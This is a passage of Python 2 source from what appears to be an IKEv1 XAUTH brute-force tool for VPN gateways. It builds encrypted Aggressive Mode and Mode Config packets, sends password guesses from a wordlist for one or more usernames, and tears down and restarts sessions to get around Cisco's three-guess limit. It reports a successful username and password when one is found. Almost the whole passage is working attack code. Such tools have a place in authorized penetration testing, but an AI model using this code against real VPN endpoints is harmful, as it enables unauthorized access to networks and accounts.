                        dicCrypto["lastBlock"] = bytesIKE.encode('hex')[-IVlen:]#p2IV and last block are the same at this point
			while len(packets) < 2:
				time.sleep(0.5)
					
                if len(packets) == 2:
			#Parse the header first
		        ikeHandling = ikehandler.IKEv1Handler(debug)
		        ikeHDR = ikeHandling.parseHeader(packets[-1])
			#Check the packet is for this session
                        if ikeHDR[1] == dicCrypto["iCookie"]:
                                pass
                        else:
				if debug > 0:
	                                print "Packet received does not match this session, this is probably from a previous incarnation."
					print "Removing packet"
                                del packets[-1]
                                continue
			#Check for informational packet
                        if ikeHDR[4] == 5:
                        	print "Informational packet received. Enable full debugging for more info. Exiting..."
				respDict  = ikeHandling.main(packets[-1],encType,hashType)
				time.sleep(2)
                        	exit()
			else:
				pass
			#Check for a new Message ID
			try:
				if ikeHDR[5] == dicCrypto["msgID"]:
					if debug > 0:
						print "Message ID has not changed"	
				
					curIV = dicCrypto["lastBlock"].decode('hex')
                        	        pass
                        	else:
					if debug > 0:
        	                        	print "Message ID has changed, recalculating IV"
					msgID = ikeHDR[5]
					curIV = ikeCrypto.calcIV(dicCrypto["p2IV"].decode('hex'), msgID.decode('hex'), IVlen, hashType)				
                        	        pass
			except:
                                print "Invalid Message ID, too many concurrent sessions running. Wait 30 second and try again.\nExiting"
				time.sleep(2)
                                exit()
			#Parse full packet
			respDict = ikeHandling.main(packets[-1],encType,hashType,encKey,initIV,curIV)
			#Update state/crypto dictionary
			dicCrypto.update(respDict) 
			dicCrypto["lastBlock"] = packets[-1][-IVlen:]
                        #Pull the useful values from stored dictionary for crypto functions
                        nonce_i = dicCrypto["nonce_i"]
                        DHPubKey_i = dicCrypto["DHPubKey_i"]
                        nonce_r = dicCrypto["nonce_r"]
                        ID_i = dicCrypto["ID_i"]
                        ID_r = dicCrypto["ID_r"]
                        rCookie = dicCrypto["rCookie"]
			iCookie = dicCrypto["iCookie"]
                        msgID = dicCrypto["msgID"]
                        privKey = dicCrypto["privKey"] 
                        DHPubKey_r = dicCrypto["DHPubKey_r"]
                        SA_i = dicCrypto["SA_i"]
			xType = int(dicCrypto["xType"])
                        if xType != 6:
                                print "Expected Mode Config Transaction packet."
                                print "Exiting...\n"
				time.sleep(2)
                                exit()
			else:
				pass

			try:
				guessno
				wordline += 3
				guessno = 0
			except:
				wordline = 0
				guessno = 0


			for w in wordsfile:
				passcount += 1
				password = w.strip()
				#Print update if return is pressed
				readInput = [sys.stdin]
				inp = select.select(readInput, [], [], 0.1)[0]
				if inp:
					percent = wordline / float(wordcount) * 100
                                	print "Current Guess: %s:%s (%s%%)\n"%(username,password,int(percent))
					tcflush(sys.stdin, TCIOFLUSH)
					
				else:
					pass
				#Count number of guesses to reset connection after 3 for Cisco devices
				guessno += 1
				#Process response packet
				if debug > 0:
					print "\n--------------------Sending third packet - Encrypted XAUTH reply (username: %s password: %s)--------------------"%(username,password)
				xType = "06" #Mode Config transation			
                        	#Xauth Attributes data
				try:
					vendorType
	                                if vendorType == "cisco":
	                                	typeXAUTH = ikeneg.ikeXAUTH(0,16520,0,vendorType)
						userXAUTH = ikeneg.ikeXAUTH(0,16521,username)
	                                	passXAUTH = ikeneg.ikeXAUTH(0,16522,password)
	                                	mcfgAtts = typeXAUTH+userXAUTH+passXAUTH
	                                else:
	                                        userXAUTH = ikeneg.ikeXAUTH(0,16521,username)
	                                        passXAUTH = ikeneg.ikeXAUTH(0,16522,password)
	                                        mcfgAtts = userXAUTH+passXAUTH
                                except:
                                        userXAUTH = ikeneg.ikeXAUTH(0,16521,username)
                                        passXAUTH = ikeneg.ikeXAUTH(0,16522,password)
                                        mcfgAtts = userXAUTH+passXAUTH

				#Mode Config payload
				arrayMCFG = ikeneg.ikeModeCFG("00","02",mcfgAtts) #02 = mode config reply
	                        lenMCFG = len(arrayMCFG)
	                        bytesMCFG = struct.pack(("B"*lenMCFG),*arrayMCFG)
	
				#Mode Config Hash payload
				skeyid_a = dicCrypto["skeyid_a"]
				mcfgHash = ikeCrypto.calcHASHmcfg(skeyid_a, msgID.decode('hex'), bytesMCFG, hashType)
				if debug > 0:
					print "Mode Config Hash = %s"%mcfgHash
	                        arrayHash = ikeneg.ikeHash("0e",mcfgHash) #next payload 0e(14) - Mode Config Attributes
	                        lenHash = len(arrayHash)
	                        bytesHash = struct.pack(("B"*lenHash),*arrayHash)

	                        #Encrypt everything but the header
	                        plainData = (bytesHash+bytesMCFG)
	                        plainPayload = ikeCrypto.calcPadding(encType, plainData)
	                        if debug > 0:
	                                print "Plain-text Payload: %s"%plainPayload.encode('hex')

				#Encryption/decryption uses last block from previous encrypted payload (CBC) except when a new message ID is created
	                        cipher = ikeCrypto.ikeCipher(encKey, dicCrypto["lastBlock"].decode('hex'), encType)
	                        encPayload = cipher.encrypt(plainPayload)

	                        if debug > 0:
	                                print "Encrypted Payload: %s"%encPayload.encode('hex')

	                        arrayencPayload = array.array('B', encPayload)
	                        lenencPayload = len(arrayencPayload)
	                        bytesencPayload = struct.pack(("B"*lenencPayload),*arrayencPayload)
	                        arrayHDR = ikeneg.ikeHeader("08",iCookie,rCookie,flags,xType,msgID,lenencPayload)#next payload is always hash (08)
	                        lenHDR = len(arrayHDR)
	                        bytesHDR = struct.pack(("B"*lenHDR),*arrayHDR)
	                        bytesIKE = bytesHDR+bytesencPayload

	                        ikeneg.sendPacket(bytesIKE,targetIP,sport,port)
				dicCrypto["lastBlock"] = bytesIKE.encode('hex')[-IVlen:]
				while len(packets) < 3:
					time.sleep(0.5)

						
                	        if len(packets) == 3:
	                        	#Parse the header first
	                        	ikeHandling = ikehandler.IKEv1Handler(debug)
	                        	ikeHDR = ikeHandling.parseHeader(packets[-1])
	                        	#Check the packet is for this session
	                        	if ikeHDR[1] == dicCrypto["iCookie"]:
	                        	        pass
	                        	else:   
						if debug > 0:
		                        	        print "Packet received does not match this session, this is probably from a previous incarnation."
							print "Removing packet"
	                        		del packets[-1]
	                        	        continue

					if ikeHDR[4] == 5:
                                		print "Informational packet received. Enable full debugging for more info. Exiting..."
						respDict  = ikeHandling.main(packets[-1],encType,hashType)
						time.sleep(2)
                                		exit()

	                        	try:   
	                        		#Check for a new Message ID
        	                        	if ikeHDR[5] == dicCrypto["msgID"]:
                	                	        if debug > 0:
                	                	                print "Message ID has not changed"
	
	                                	        curIV = dicCrypto["lastBlock"].decode('hex')
	                                	        pass    
       	                        		else:
                                        		if debug > 0:
                                        		        print "Message ID has changed, recalculating IV"
                                        		msgID = ikeHDR[5]
                                        		curIV = ikeCrypto.calcIV(dicCrypto["p2IV"].decode('hex'), msgID.decode('hex'), IVlen, hashType)
                                        		pass
                        		except:
                        	        	print "Invalid Message ID, too many concurrent sessions running. Wait 30 seconds and try again.\nExiting"
						time.sleep(2)
                                		exit()

			
	        		        respDict = ikeHandling.main(packets[-1],encType,hashType,encKey,initIV,curIV)
	        		        #Update state/crypto dictionary
					dicCrypto = dict(dicCrypto.items() + respDict.items())
	        		        dicCrypto["lastBlock"] = packets[-1][-IVlen:]
			                #Pull the useful values from stored dictionary for crypto functions
			                nonce_i = dicCrypto["nonce_i"]
			                DHPubKey_i = dicCrypto["DHPubKey_i"]
			       	        nonce_r = dicCrypto["nonce_r"]
			       	        ID_i = dicCrypto["ID_i"]
		                        ID_r = dicCrypto["ID_r"]
		                        rCookie = dicCrypto["rCookie"]
		                        iCookie = dicCrypto["iCookie"]
		                        msgID = dicCrypto["msgID"]
		                        privKey = dicCrypto["privKey"]
		                        DHPubKey_r = dicCrypto["DHPubKey_r"]
		                        SA_i = dicCrypto["SA_i"]
		                        xType = int(dicCrypto["xType"])
		                        if xType != 6:
		                                print "Expected Mode Config Transaction packet."
		                                print "Exiting...\n"
						time.sleep(2)
		                                exit()
		                        else:   
		                                pass
					if int(dicCrypto["mcfgType"]) == 1:
						if debug > 0:
							print "Retransmitted XAUTH request received, Continuing..."
						del packets[-1]
						continue

                                        if int(dicCrypto["mcfgType"]) == 3 and int(dicCrypto["XAUTH_STATUS"]) == 0:
						try:
							vendorType
						except:
							vendorType = "unknown"


						if vendorType == "cisco":
							if debug > 0:
								"XAUTH Authentication failed, restarting connection."
                                                        if guessno == 3 and passcount < wordcount:
                                                                if debug > 0:
                                                                        print "Cisco 3 guess limit reached, restarting"
	                        				xType = "05" #Informational

								#Process Delete payload
                                                                #Hash payload
                                                                arrayHash = ikeneg.ikeHash("0c",hash_i) # next payload - 12 (delete)
                                                                lenHash = len(arrayHash)
                                                                bytesHash = struct.pack(("B"*lenHash),*arrayHash)
									
								#Delete payload
								if debug > 0:
									        print "\n--------------------Sending Delete Packet--------------------"
								arrayDel = ikeneg.ikeDelete("00",iCookie,rCookie)
								lenDel = len(arrayDel)
								bytesDel = struct.pack(("B"*lenDel),*arrayDel)

								#Encrypt everything but the header
                        					plainData = (bytesHash+bytesDel)
                        					plainPayload = ikeCrypto.calcPadding(encType, plainData)
                        					if debug > 0:
                        				        	print "Plain-text Payload: %s"%plainPayload.encode('hex')

         			               			#Encryption/decryption uses last block from previous encrypted payload (CBC) except when a new message ID is created
								#Calc message ID and current IV
								msgID = "0000111b"
								curIV = ikeCrypto.calcIV(dicCrypto["p2IV"].decode('hex'), msgID.decode('hex'), IVlen, hashType)
                        					cipher = ikeCrypto.ikeCipher(encKey, curIV, encType)
                        					encPayload = cipher.encrypt(plainPayload)

                        					if debug > 0:
                        				        	print "Encrypted Payload: %s"%encPayload.encode('hex')
			
        	        			        	arrayencPayload = array.array('B', encPayload)
        	                				lenencPayload = len(arrayencPayload)
        	                				bytesencPayload = struct.pack(("B"*lenencPayload),*arrayencPayload)

                                                                arrayHDR = ikeneg.ikeHeader("08",iCookie,rCookie,flags,xType,msgID,lenencPayload)#next payload is always hash (08)
                                                                lenHDR = len(arrayHDR)
                                                                bytesHDR = struct.pack(("B"*lenHDR),*arrayHDR)

								#Send Delete payload
								bytesIKE = bytesHDR+bytesencPayload
								ikeneg.sendPacket(bytesIKE,targetIP,sport,port)
								if debug > 0:
									print "RESTARTING CISCO 3 LIMIT REACHED"
								del nonce_i,nonce_r,DHPubKey_i,ID_i,ID_r,rCookie,iCookie,msgID,privKey,DHPubKey_r,SA_i,xType,initIV,curIV
                                                                del packets[:]
								del dupPackets[:]
								del listVIDs[:]
								dicCrypto.clear()
                                                                respDict.clear()
                                                                initDict.clear()
								dicVIDs.clear()
								break
								
							else:
								pass
						else:
        	                                        pass

		                        if dicCrypto["mcfgType"] == "03" or dicCrypto["mcfgType"] == 3 and int(dicCrypto["XAUTH_STATUS"]) == 1:
						#False positive check for older ASA's
                                                try:
                                                        aType = int(authType)
                                                except:
                                                        aType = int(authType,16)
                                                if vendorType == "cisco" and aType == 1 and wordline < 1:
                                                        print "\n[-]Older ASA detected, run the tool again with authentication type 65001 (XAUTHInitPreShare) instead of type 1 (PSK). Exiting..."
						else:
							print "[*]XAUTH Authentication Successful! Username: %s Password: %s\nSending ACK packet...\n"%(username,password)

		                                #Mode Config payload - ACK
		                                ackXAUTH = ikeneg.ikeXAUTH(0,16527,"00")
		                                mcfgAtts = ackXAUTH
		                                arrayMCFG = ikeneg.ikeModeCFG("00","04",mcfgAtts) #04 = mode config ACK
		                                lenMCFG = len(arrayMCFG)
		                                bytesMCFG = struct.pack(("B"*lenMCFG),*arrayMCFG)
			                        #Process response packet
						if debug > 0:
							print "\n--------------------Sending third packet - Encrypted XAUTH ACK ---------------------\n"
                        			xType = "06" #Mode Config transation

                        			#Hash payload
                        			skeyid_a = dicCrypto["skeyid_a"]
                        			mcfgHash = ikeCrypto.calcHASHmcfg(skeyid_a, msgID.decode('hex'), bytesMCFG, hashType)
                        			if debug > 0:
                        			        print "Mode Config Hash = %s"%mcfgHash
                        			arrayHash = ikeneg.ikeHash("0e",mcfgHash) #next payload 0e(14) - Mode Config Attributes
                        			lenHash = len(arrayHash)
                        			bytesHash = struct.pack(("B"*lenHash),*arrayHash)

			                        #Encrypt everything but the header
                			        plainData = (bytesHash+bytesMCFG)
                        			plainPayload = ikeCrypto.calcPadding(encType, plainData)
                        			if debug > 0:
                                			print "Plain-text Payload: %s"%plainPayload.encode('hex')

                        			#Encryption/decryption uses last block from previous encrypted payload (CBC) except when a new message ID is created
                        			cipher = ikeCrypto.ikeCipher(encKey, dicCrypto["lastBlock"].decode('hex'), encType)
                        			encPayload = cipher.encrypt(plainPayload)

                        			if debug > 0:
                                			print "Encrypted Payload: %s"%encPayload.encode('hex')

                        			arrayencPayload = array.array('B', encPayload)
                        			lenencPayload = len(arrayencPayload)
                        			bytesencPayload = struct.pack(("B"*lenencPayload),*arrayencPayload)
                        			arrayHDR = ikeneg.ikeHeader("08",iCookie,rCookie,flags,xType,msgID,lenencPayload)#next payload is always hash (08)
                        			lenHDR = len(arrayHDR)
                        			bytesHDR = struct.pack(("B"*lenHDR),*arrayHDR)
                        			bytesIKE = bytesHDR+bytesencPayload
						
						#Send ACK packet
                        			ikeneg.sendPacket(bytesIKE,targetIP,sport,port)
                        			dicCrypto["lastBlock"] = bytesIKE.encode('hex')[-IVlen:]
			                        time.sleep(1)

		                                #Delete payload
                                		arrayDel = ikeneg.ikeDelete("00",iCookie,rCookie)
                                		lenDel = len(arrayDel)
                                		bytesDel = struct.pack(("B"*lenDel),*arrayDel)

                                		#Encrypt everything but the header
                                		plainData = (bytesHash+bytesDel)
                                		plainPayload = ikeCrypto.calcPadding(encType, plainData)
                                		if debug > 0:
                                		        print "Plain-text Payload: %s"%plainPayload.encode('hex')
	
                                		#Encryption/decryption uses last block from previous encrypted payload (CBC) except when a new message ID is created
                                		#Calc message ID and current IV
                                		msgID = "0000111b"
                                		curIV = ikeCrypto.calcIV(dicCrypto["p2IV"].decode('hex'), msgID.decode('hex'), IVlen, hashType)
                                		cipher = ikeCrypto.ikeCipher(encKey, curIV, encType)
                                		encPayload = cipher.encrypt(plainPayload)
                                		if debug > 0:
                                        		print "Encrypted Payload: %s"%encPayload.encode('hex')

                                		arrayencPayload = array.array('B', encPayload)
                                		lenencPayload = len(arrayencPayload)
                                		bytesencPayload = struct.pack(("B"*lenencPayload),*arrayencPayload)

                                		arrayHDR = ikeneg.ikeHeader("08",iCookie,rCookie,flags,xType,msgID,lenencPayload)#next payload is always hash (08)
                                		lenHDR = len(arrayHDR)
                                		bytesHDR = struct.pack(("B"*lenHDR),*arrayHDR)

                                		#Send Delete payload
                                		bytesIKE = bytesHDR+bytesencPayload
                                		ikeneg.sendPacket(bytesIKE,targetIP,sport,port)
                        			time.sleep(2)
						exit()
				

					if dicCrypto["mcfgType"] == "03" or dicCrypto["mcfgType"] == 3 and int(dicCrypto["XAUTH_STATUS"]) == 0:
						del packets[-2]
						pass

					else:
						#Check packet is for this session
                                        	if ikeHDR[1] == dicCrypto["iCookie"]:
                                        		pass
                                        	else:
                                                	if debug > 0:
                                                        	print "Packet received does not match this session, this is probably from a previous incarnation."
                                                        	print "Removing packet"
                                                	del packets[-1]
                                                	continue

						#Exit on receiving informational packet
						if ikeHDR[4] == 5:
							print "Informational packet received. Enable full debugging for more info. Exiting..."
							respDict  = ikeHandling.main(packets[-1],encType,hashType)
							time.sleep(2)
							exit()
						else:
							pass
						pass

                        if passcount != 0 and passcount == wordcount:
                                print "[-]Password not found. Trying next user...\n"
                                xType = "05" #Informational
                                #Process Delete payload
                                #Hash payload
                                if debug > 0:
                                        print "Sending Delete payload to reset connection"
                                arrayHash = ikeneg.ikeHash("0c",hash_i) # next payload - 12 (delete)
                                lenHash = len(arrayHash)
                                bytesHash = struct.pack(("B"*lenHash),*arrayHash)

                                #Delete payload
                                arrayDel = ikeneg.ikeDelete("00",iCookie,rCookie)
                                lenDel = len(arrayDel)
                                bytesDel = struct.pack(("B"*lenDel),*arrayDel)

                                #Encrypt everything but the header
                                plainData = (bytesHash+bytesDel)                                 
                                plainPayload = ikeCrypto.calcPadding(encType, plainData)
                                if debug > 0:
                                        print "Plain-text Payload: %s"%plainPayload.encode('hex')

                                #Encryption/decryption uses last block from previous encrypted payload (CBC) except when a new message ID is created
                                #Calc message ID and current IV
                                msgID = "0000111b"
                                curIV = ikeCrypto.calcIV(dicCrypto["p2IV"].decode('hex'), msgID.decode('hex'), IVlen, hashType)
                                cipher = ikeCrypto.ikeCipher(encKey, curIV, encType)
                                encPayload = cipher.encrypt(plainPayload)
                                if debug > 0:
                                        print "Encrypted Payload: %s"%encPayload.encode('hex')

                                arrayencPayload = array.array('B', encPayload)
                                lenencPayload = len(arrayencPayload)
                                bytesencPayload = struct.pack(("B"*lenencPayload),*arrayencPayload)

                                arrayHDR = ikeneg.ikeHeader("08",iCookie,rCookie,flags,xType,msgID,lenencPayload)#next payload is always hash (08)
                                lenHDR = len(arrayHDR)
                                bytesHDR = struct.pack(("B"*lenHDR),*arrayHDR)

                                #Send Delete payload
                                bytesIKE = bytesHDR+bytesencPayload
                                ikeneg.sendPacket(bytesIKE,targetIP,sport,port)
                                del nonce_i,nonce_r,DHPubKey_i,ID_i,ID_r,rCookie,iCookie,msgID,privKey,DHPubKey_r,SA_i,xType,initIV,curIV
                                del packets[:]
                                del dupPackets[:]
                                del listVIDs[:]
                                dicCrypto.clear()
                                respDict.clear()
                                initDict.clear()
                                dicVIDs.clear()
                                break

			else:
				pass

		else:
                        if debug > 0:
                                print "Response received, processing packet..."
                        #Parse the header first
                        ikeHandling = ikehandler.IKEv1Handler(debug)
                        ikeHDR = ikeHandling.parseHeader(packets[-1])


                        #Check the packet is for this session
                        if ikeHDR[1] == dicCrypto["iCookie"]:
                                pass
                        else:   
				if debug > 0:
	                                print "Packet received does not match this session, this is probably from a previous incarnation."
					print "Removing packet"
                                del packets[-1]
                                continue
			if ikeHDR[4] == 5:
				print "Informational packet received. Enable full debugging for more info. Exiting..."
				respDict  = ikeHandling.main(packets[-1],encType,hashType)
				time.sleep(2)
				exit()
			else:
				pass
                        try:   
                                if ikeHDR[5] == dicCrypto["msgID"]:
                                        if debug > 0:
                                                print "Message ID has not changed"

                                        curIV = dicCrypto["lastBlock"].decode('hex')
                                        pass    
                                else:
                                        if debug > 0:
                                                print "Message ID has changed, recalculating IV"
                                        msgID = ikeHDR[5]
                                        curIV = ikeCrypto.calcIV(dicCrypto["p2IV"].decode('hex'), msgID.decode('hex'), IVlen, hashType)
                                        pass
                        except:
                                print "Invalid Message ID, too many concurrent sessions running. Wait 30 second and try again.\nExiting"
				time.sleep(2)
                                exit()

                        respDict = ikeHandling.main(packets[-1],encType,hashType,encKey,initIV,curIV)
                        #Update state/crypto dictionary
                        dicCrypto.update(respDict)
                        dicCrypto["lastBlock"] = packets[-1][-IVlen:]

	      #Exit if while condition is not met (eof)
	      print "[-]Password not found, try another wordlist. Exiting...\n"
	      time.sleep(2)
	      exit()

	     #Else use a single user
	     else:
	      while passcount < wordcount:
		if len(packets) == 0:
			if debug > 0:
				print "\n--------------------Sending first Aggressive Mode packet--------------------"
			try:
				iCookie
			except:
				iCookie = ikeneg.secRandom(8).encode('hex')
			try:
				rCookie
			except:
				rCookie = "0000000000000000"

			initDict = ikeneg.main(iCookie,rCookie,encType,hashType,authType,DHGroup,IDdata,"00",targetIP,idType,sport,0,keyLen)
			time.sleep(speed)
			if len(packets) == 0:
				print "No response received, exiting...\n"
				time.sleep(2)
				exit()
			dicCrypto = dict(initDict.items())
			while len(packets) < 1:
				time.sleep(0.5)

		if len(packets) == 1:
			if debug > 0:
				print "Response received, processing packet..."

                        #Parse the header first
                        ikeHandling = ikehandler.IKEv1Handler(debug)
                        ikeHDR = ikeHandling.parseHeader(packets[-1])
                        #Check the packet is for this session
                        if ikeHDR[1] == dicCrypto["iCookie"]:
                                pass
                        else:
                                if debug > 0:
                                        print "Packet received does not match this session, this is probably from a previous incarnation"
                                        print "Removing packet"
                                del packets[-1]
                                continue

                        #Check for informational packet
                        if ikeHDR[4] == 5:
                                print "Informational packet received. Enable full debugging for more info. Exiting..."
                                respDict  = ikeHandling.main(packets[-1],encType,hashType)
				time.sleep(2)
                                exit()
                        else:
                                pass

			flags = "01"
			ikeHandling = ikehandler.IKEv1Handler(debug)
			respDict,listVIDs  = ikeHandling.main(packets[-1],encType,hashType)
			dicVIDs = vid.dicVIDs
			for i in listVIDs:
				try:
					if debug > 0:
						print "VID received: %s (%s)"%(dicVIDs[i], i)
					if "Cisco" in dicVIDs[i]:
						vendorType = "cisco"
				except:
					if debug > 0:
						print "Unknown VID received: %s"%i
	

			#Combine the dictionaries from sent packet and received packet
			dicCrypto.update(respDict)
			#Pull the useful values from stored dictionary for crypto functions
                        nonce_i = dicCrypto["nonce_i"]
                        DHPubKey_i = dicCrypto["DHPubKey_i"]
			nonce_r = dicCrypto["nonce_r"]
			ID_i = dicCrypto["ID_i"]
			ID_r = dicCrypto["ID_r"]
			rCookie = dicCrypto["rCookie"]
			xType = dicCrypto["xType"]
			msgID = dicCrypto["msgID"]
			privKey = dicCrypto["privKey"]
			DHPubKey_r = dicCrypto["DHPubKey_r"]
			SA_i = dicCrypto["SA_i"]

			#Check exchange type is in the right format
			try:
				xType = hex(xType)[2:].zfill(2)
			except:
				pass
			
			#Construct final aggressive mode exchange packet
			if debug > 0:
				print "\n--------------------Sending second aggressive mode packet--------------------"
			#Run Crypto Functions - DH first
			ikeDH = dh.DiffieHellman(DHGroup)
			secret = ikeDH.genSecret(privKey,int(DHPubKey_r,16))
			hexSecret = '{0:x}'.format(secret)#using new formating to deal with long int, if this fails fallback to old style
			if len(hexSecret) % 2 != 0:
				hexSecret = "0" + hexSecret
			if debug > 0:
				print "Secret: %s"%secret
				print "Hexlified Secret: %s"%hexSecret

			skeyid = ikeCrypto.calcSKEYID(psk, nonce_i.decode('hex'), nonce_r.decode('hex'), hashType)
			hash_i = ikeCrypto.calcHASH(skeyid, DHPubKey_r.decode('hex'), DHPubKey_i.decode('hex'), rCookie.decode('hex'), iCookie.decode('hex'), SA_i.decode('hex'), ID_r.decode('hex'), ID_i.decode('hex'),"i",hashType)
			hash_r = ikeCrypto.calcHASH(skeyid, DHPubKey_r.decode('hex'), DHPubKey_i.decode('hex'), rCookie.decode('hex'), iCookie.decode('hex'), SA_i.decode('hex'),ID_r.decode('hex'), ID_i.decode('hex'),"r",hashType)
			skeyid_d = ikeCrypto.calcSKEYID_d(skeyid, hexSecret.decode('hex'), iCookie.decode('hex'), rCookie.decode('hex'), hashType)
			skeyid_a = ikeCrypto.calcSKEYID_a(skeyid, skeyid_d, hexSecret.decode('hex'), iCookie.decode('hex'), rCookie.decode('hex'), hashType)
			skeyid_e = ikeCrypto.calcSKEYID_e(skeyid, skeyid_a, hexSecret.decode('hex'), iCookie.decode('hex'), rCookie.decode('hex'), hashType)
			if len(skeyid_e) < keyLen:   
				encKey = ikeCrypto.calcKa(skeyid_e, keyLen, hashType)
                                if debug > 0:
                                        print "Encryption Key: %s"%encKey.encode('hex')
			else:
				encKey = skeyid_e[:keyLen]
				if debug > 0:
					print "Encryption Key: %s"%encKey.encode('hex')
			initIV = ikeCrypto.calcIV(DHPubKey_i.decode('hex'),DHPubKey_r.decode('hex'), IVlen, hashType)
			
			dicCrypto["skeyid"] = skeyid
			dicCrypto["skeyid_a"] = skeyid_a
			dicCrypto["skeyid_d"] = skeyid_d
			dicCrypto["skeyid_e"] = skeyid_e
			dicCrypto["encKey"] = encKey
			dicCrypto["initIV"] = initIV
			#Hash payload
			arrayHash = ikeneg.ikeHash("0d",hash_i)#next payload - VID (13)
                        lenHash = len(arrayHash)
                        bytesHash = struct.pack(("B"*lenHash),*arrayHash)
			#VID payload
			arrayVID = ikeneg.ikeVID("00","09002689dfd6b712")
                        lenVID = len(arrayVID)
                        bytesVID = struct.pack(("B"*lenVID),*arrayVID)
                        #Encrypt everything but the header
			plainData = bytesHash+bytesVID
			plainPayload = ikeCrypto.calcPadding(encType, plainData)
			if debug > 0: 
                                print "Plain-text Payload: %s"%plainPayload.encode('hex')
			
                        cipher = ikeCrypto.ikeCipher(encKey, initIV, encType)
                        encPayload = cipher.encrypt(plainPayload)
			
			if debug > 0:
				print "Encrypted Payload: %s"%encPayload.encode('hex')

        		arrayencPayload = array.array('B', encPayload)
			lenencPayload = len(arrayencPayload)
			bytesencPayload = struct.pack(("B"*lenencPayload),*arrayencPayload)
			arrayHDR = ikeneg.ikeHeader("08",iCookie,rCookie,flags,xType,msgID,lenencPayload)#next payload is always hash (08)
			lenHDR = len(arrayHDR)
			bytesHDR = struct.pack(("B"*lenHDR),*arrayHDR)
      	  		bytesIKE = bytesHDR+bytesencPayload
			ikeneg.sendPacket(bytesIKE,targetIP,sport,port)
			dicCrypto["p2IV"] = bytesIKE.encode('hex')[-IVlen:]
                        dicCrypto["lastBlock"] = bytesIKE.encode('hex')[-IVlen:]#p2IV and last block are the same at this point
			while len(packets) < 2:
				time.sleep(0.5)
					
                if len(packets) == 2:
			#Parse the header first
		        ikeHandling = ikehandler.IKEv1Handler(debug)
		        ikeHDR = ikeHandling.parseHeader(packets[-1])
			#Check the packet is for this session
                        if ikeHDR[1] == dicCrypto["iCookie"]:
                                pass
                        else:
				if debug > 0:
	                                print "Packet received does not match this session, this is probably from a previous incarnation."
					print "Removing packet"
                                del packets[-1]
                                continue

                        if ikeHDR[4] == 5:
                                print "Informational packet received. Enable full debugging for more info. Exiting..."
				respDict  = ikeHandling.main(packets[-1],encType,hashType)
				time.sleep(2)
                                exit()
                        else:
                                pass
			#Check for a new Message ID
			try:
				if ikeHDR[5] == dicCrypto["msgID"]:
					if debug > 0:
						print "Message ID has not changed"	
				
					curIV = dicCrypto["lastBlock"].decode('hex')
                        	        pass
                        	else:
					if debug > 0:
        	                        	print "Message ID has changed, recalculating IV"
					msgID = ikeHDR[5]
					curIV = ikeCrypto.calcIV(dicCrypto["p2IV"].decode('hex'), msgID.decode('hex'), IVlen, hashType)				
                        	        pass
			except:
                                print "Invalid Message ID, too many concurrent sessions running. Wait 30 second and try again.\nExiting"
				time.sleep(2)
                                exit()
			#Parse full packet
			respDict = ikeHandling.main(packets[-1],encType,hashType,encKey,initIV,curIV)
			#Update state/crypto dictionary
			dicCrypto.update(respDict) 
			dicCrypto["lastBlock"] = packets[-1][-IVlen:]
                        #Pull the useful values from stored dictionary for crypto functions
                        nonce_i = dicCrypto["nonce_i"]
                        DHPubKey_i = dicCrypto["DHPubKey_i"]
                        nonce_r = dicCrypto["nonce_r"]
                        ID_i = dicCrypto["ID_i"]
                        ID_r = dicCrypto["ID_r"]
                        rCookie = dicCrypto["rCookie"]
			iCookie = dicCrypto["iCookie"]
                        msgID = dicCrypto["msgID"]
                        privKey = dicCrypto["privKey"] 
                        DHPubKey_r = dicCrypto["DHPubKey_r"]
                        SA_i = dicCrypto["SA_i"]
			xType = int(dicCrypto["xType"])
                        if xType != 6:
                                print "Expected Mode Config Transaction packet."
                                print "Exiting...\n"
				time.sleep(2)
                                exit()
			else:
				pass

			try:
				guessno
				wordline += 3
				guessno = 0
			except:
				wordline = 0
				guessno = 0

			for w in wordsfile:
				passcount += 1
				password = w.strip()
				#Print update if return is pressed
				readInput = [sys.stdin]
				inp = select.select(readInput, [], [], 0.1)[0]
				if inp:
					percent = wordline / float(wordcount) * 100
                                	print "Current Guess: %s:%s (%s%%)\n"%(username,password,int(percent))
					tcflush(sys.stdin, TCIOFLUSH)
					
				else:
					pass
				#Count number of guesses to reset connection after 3 for Cisco devices
				guessno += 1
				#Process response packet
				if debug > 0:
					print "\n--------------------Sending third packet - Encrypted XAUTH reply (username: %s password: %s)--------------------"%(username,password)
				xType = "06" #Mode Config transation			
                        	#Xauth Attributes data
				try:
					vendorType
	                                if vendorType == "cisco":
	                                        typeXAUTH = ikeneg.ikeXAUTH(0,16520,0,vendorType)
	                                        userXAUTH = ikeneg.ikeXAUTH(0,16521,username)
	                                        passXAUTH = ikeneg.ikeXAUTH(0,16522,password)
	                                        mcfgAtts = typeXAUTH+userXAUTH+passXAUTH
	                                else:
	                                        userXAUTH = ikeneg.ikeXAUTH(0,16521,username)
	                                        passXAUTH = ikeneg.ikeXAUTH(0,16522,password)
	                                        mcfgAtts = userXAUTH+passXAUTH
                                except:
                                        userXAUTH = ikeneg.ikeXAUTH(0,16521,username)
                                        passXAUTH = ikeneg.ikeXAUTH(0,16522,password)
                                        mcfgAtts = userXAUTH+passXAUTH

				#Mode Config payload
				arrayMCFG = ikeneg.ikeModeCFG("00","02",mcfgAtts) #02 = mode config reply
	                        lenMCFG = len(arrayMCFG)
	                        bytesMCFG = struct.pack(("B"*lenMCFG),*arrayMCFG)
	
				#Mode Config Hash payload
				skeyid_a = dicCrypto["skeyid_a"]
				mcfgHash = ikeCrypto.calcHASHmcfg(skeyid_a, msgID.decode('hex'), bytesMCFG, hashType)
				if debug > 0:
					print "Mode Config Hash = %s"%mcfgHash
	                        arrayHash = ikeneg.ikeHash("0e",mcfgHash) #next payload 0e(14) - Mode Config Attributes
	                        lenHash = len(arrayHash)
	                        bytesHash = struct.pack(("B"*lenHash),*arrayHash)

	                        #Encrypt everything but the header
	                        plainData = (bytesHash+bytesMCFG)
	                        plainPayload = ikeCrypto.calcPadding(encType, plainData)
	                        if debug > 0:
	                                print "Plain-text Payload: %s"%plainPayload.encode('hex')

				#Encryption/decryption uses last block from previous encrypted payload (CBC) except when a new message ID is created
	                        cipher = ikeCrypto.ikeCipher(encKey, dicCrypto["lastBlock"].decode('hex'), encType)
	                        encPayload = cipher.encrypt(plainPayload)

	                        if debug > 0:
	                                print "Encrypted Payload: %s"%encPayload.encode('hex')

	                        arrayencPayload = array.array('B', encPayload)
	                        lenencPayload = len(arrayencPayload)
	                        bytesencPayload = struct.pack(("B"*lenencPayload),*arrayencPayload)
	                        arrayHDR = ikeneg.ikeHeader("08",iCookie,rCookie,flags,xType,msgID,lenencPayload)#next payload is always hash (08)
